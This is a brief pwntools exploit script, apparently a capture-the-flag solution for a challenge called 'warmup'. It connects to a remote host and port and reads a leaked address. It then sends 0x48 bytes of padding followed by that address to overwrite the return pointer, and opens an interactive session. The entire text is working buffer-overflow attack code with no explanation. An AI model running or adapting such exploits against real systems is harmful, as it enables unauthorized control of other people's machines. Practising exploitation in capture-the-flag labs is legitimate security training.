from pwn import *

#sh=process('./warmup')
sh=remote('111.198.29.45','30685')
sh.recvuntil('WOW:')
addr = int(sh.recvuntil('\n',drop=True),16)
sh.sendline('a'*0x48+p64(addr))
#gdb.attach(sh)
sh.interactive()
